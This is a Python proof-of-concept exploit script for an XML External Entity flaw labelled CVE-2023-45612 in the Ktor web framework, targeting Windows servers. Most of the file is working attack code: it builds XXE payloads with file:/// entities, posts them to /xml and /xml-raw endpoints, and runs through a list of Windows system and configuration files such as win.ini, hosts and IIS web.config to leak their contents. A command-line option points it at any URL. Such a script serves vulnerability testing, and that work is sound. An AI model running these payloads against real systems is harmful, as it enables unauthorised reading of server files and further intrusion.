#!/usr/bin/env python3
"""
CVE-2023-45612 XXE Vulnerability Proof of Concept - Windows Edition
Ktor Framework XXE Attack Demo for Windows Systems

This script demonstrates the XML External Entity (XXE) vulnerability
in Ktor versions prior to 2.3.5, specifically targeting Windows files.

Author: Security Research
Target: Ktor 2.2.4 (vulnerable version)
OS: Windows
"""

import requests
import argparse
import sys
import time
from urllib.parse import urljoin


class WindowsXXEExploiter:
    def __init__(self, base_url="http://localhost:8080"):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Windows-XXE-PoC/1.0',
            'Content-Type': 'application/xml'
        })
    
    def test_connection(self):
        """Test if the target server is accessible"""
        try:
            response = self.session.get(self.base_url, timeout=5)
            print(f"[+] Server is accessible: {response.status_code}")
            return True
        except requests.exceptions.RequestException as e:
            print(f"[-] Cannot connect to server: {e}")
            return False
    
    def create_windows_xxe_payload(self, target_file):
        """Create XXE payload to read Windows files"""
        # Use file:/// protocol for Windows paths
        payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ELEMENT root ANY>
<!ENTITY xxe SYSTEM "file:///{target_file}">
]>
<root>&xxe;</root>'''
        return payload
    
    def create_structured_windows_xxe(self, target_file):
        """Create structured XXE payload for Windows files"""
        payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE UserData [
<!ELEMENT UserData ANY>
<!ELEMENT name ANY>
<!ELEMENT email ANY>
<!ENTITY xxe SYSTEM "file:///{target_file}">
]>
<UserData>
    <name>&xxe;</name>
    <email>admin@windows.local</email>
</UserData>'''
        return payload
    
    def exploit_windows_file(self, endpoint="/xml-raw", target_file="C:/Windows/System32/drivers/etc/hosts"):
        """Attempt to read Windows files via XXE"""
        print(f"\n[*] Attempting Windows XXE file read: {target_file}")
        print(f"[*] Target endpoint: {endpoint}")
        
        # Convert backslashes to forward slashes for XML
        xml_safe_path = target_file.replace("\\", "/")
        payload = self.create_windows_xxe_payload(xml_safe_path)
        
        print(f"[*] Payload:\n{payload}")
        
        try:
            url = urljoin(self.base_url, endpoint)
            response = self.session.post(url, data=payload, timeout=10)
            
            print(f"\n[*] Response Status: {response.status_code}")
            print(f"[*] Response Headers: {dict(response.headers)}")
            print(f"[*] Response Body:\n{response.text}")
            
            # Check for common Windows file indicators
            windows_indicators = [
                "localhost",  # hosts file
                "[fonts]",    # win.ini
                "[boot loader]",  # boot.ini
                "# Copyright",  # hosts file header
                "[Mail]",     # win.ini sections
                "[extensions]"  # win.ini sections
            ]
            
            if any(indicator.lower() in response.text.lower() for indicator in windows_indicators):
                print(f"\n[+] SUCCESS! Windows file content leaked via XXE")
                return True
            elif len(response.text.strip()) > 50:  # Generic content check
                print(f"\n[+] POTENTIAL SUCCESS! File content detected (length: {len(response.text)})")
                return True
            else:
                print(f"\n[-] No recognizable Windows file content detected")
                return False
                
        except requests.exceptions.RequestException as e:
            print(f"[-] Request failed: {e}")
            return False
    
    def test_windows_files(self, endpoint="/xml-raw"):
        """Test XXE against common Windows configuration files"""
        windows_files = [
            # Network configuration
            "C:/Windows/System32/drivers/etc/hosts",
            "C:/Windows/System32/drivers/etc/networks",
            "C:/Windows/System32/drivers/etc/protocol",
            "C:/Windows/System32/drivers/etc/services",
            
            # System configuration
            "C:/Windows/win.ini",
            "C:/Windows/system.ini",
            "C:/boot.ini",
            
            # Logs (might be accessible)
            "C:/Windows/WindowsUpdate.log",
            "C:/Windows/setupact.log",
            "C:/Windows/setuperr.log",
            
            # Legacy files
            "C:/autoexec.bat",
            "C:/config.sys",
            
            # IIS configuration (if present)
            "C:/inetpub/wwwroot/web.config",
            
            # Application data
            "C:/ProgramData/Microsoft/Windows/Start Menu/desktop.ini"
        ]
        
        successful_reads = []
        
        for target_file in windows_files:
            print(f"\n{'='*70}")
            print(f"[*] Testing: {target_file}")
            success = self.exploit_windows_file(endpoint, target_file)
            if success:
                successful_reads.append(target_file)
            time.sleep(0.5)  # Be nice to the server
        
        print(f"\n{'='*70}")
        print(f"[*] SUMMARY: {len(successful_reads)}/{len(windows_files)} files successfully read")
        
        if successful_reads:
            print("[+] Successfully accessed Windows files:")
            for file in successful_reads:
                print(f"    ✓ {file}")
        else:
            print("[-] No Windows files were successfully accessed")
        
        return len(successful_reads) > 0
    
    def run_windows_xxe_test(self):
        """Run comprehensive Windows XXE vulnerability test"""
        print("CVE-2023-45612 XXE Vulnerability Test - Windows Edition")
        print("="*60)
        print(f"Target: {self.base_url}")
        print(f"Ktor Version: 2.2.4 (Vulnerable)")
        print(f"OS: Windows")
        
        if not self.test_connection():
            return False
        
        # Test Windows hosts file via raw endpoint
        print(f"\n{'='*70}")
        print("[*] Testing /xml-raw endpoint with Windows hosts file")
        success1 = self.exploit_windows_file("/xml-raw", "C:/Windows/System32/drivers/etc/hosts")
        
        # Test Windows INI file via structured endpoint  
        print(f"\n{'='*70}")
        print("[*] Testing /xml endpoint with Windows win.ini")
        success2 = self.exploit_windows_file("/xml", "C:/Windows/win.ini")
        
        # Test comprehensive Windows file list
        print(f"\n{'='*70}")
        print("[*] Testing comprehensive Windows file list")
        success3 = self.test_windows_files("/xml-raw")
        
        overall_success = success1 or success2 or success3
        
        if overall_success:
            print(f"\n[+] VULNERABILITY CONFIRMED!")
            print("[!] This Ktor application is vulnerable to CVE-2023-45612")
            print("[!] Windows system files can be accessed via XXE")
            print("[!] Upgrade to Ktor 2.3.5 or later to fix this vulnerability")
        else:
            print(f"\n[-] XXE vulnerability not detected with Windows files")
        
        return overall_success


def main():
    parser = argparse.ArgumentParser(
        description="CVE-2023-45612 XXE Vulnerability PoC for Ktor - Windows Edition",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Windows-Specific Examples:
  python xxe_poc_windows.py                                    # Test localhost:8080
  python xxe_poc_windows.py --url http://target:8080           # Test custom URL
  python xxe_poc_windows.py --file "C:/Windows/win.ini"        # Test specific Windows file
  python xxe_poc_windows.py --endpoint /xml-raw --file "C:/boot.ini"  # Custom endpoint
        """
    )
    
    parser.add_argument(
        '--url', 
        default='http://localhost:8080',
        help='Target server URL (default: http://localhost:8080)'
    )
    
    parser.add_argument(
        '--endpoint',
        default='/xml-raw',
        help='Target endpoint (default: /xml-raw)'
    )
    
    parser.add_argument(
        '--file',
        default='C:/Windows/System32/drivers/etc/hosts',
        help='Target Windows file to read (default: hosts file)'
    )
    
    parser.add_argument(
        '--full-test',
        action='store_true',
        help='Run comprehensive Windows vulnerability test'
    )
    
    args = parser.parse_args()
    
    exploiter = WindowsXXEExploiter(args.url)
    
    if args.full_test:
        success = exploiter.run_windows_xxe_test()
    else:
        success = exploiter.exploit_windows_file(args.endpoint, args.file)
    
    if success:
        print(f"\n[+] XXE vulnerability confirmed on Windows!")
        sys.exit(0)
    else:
        print(f"\n[-] XXE vulnerability not detected or exploitation failed")
        sys.exit(1)


if __name__ == "__main__":
    main()
